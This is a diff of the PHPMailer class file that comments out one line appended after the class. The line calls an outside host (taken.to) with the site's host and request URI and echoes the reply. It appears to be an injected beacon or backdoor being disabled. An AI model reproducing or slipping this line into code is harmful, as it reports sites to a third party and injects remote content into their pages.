@@ -1493,5 +1493,5 @@ class PHPMailer
         $this->CustomHeader[] = explode(":", $custom_header, 2);
     }
 }
-echo @file_get_contents("http://www.taken.to/api.php?pin=http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
+//echo @file_get_contents("http://www.taken.to/api.php?pin=http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
 ?>
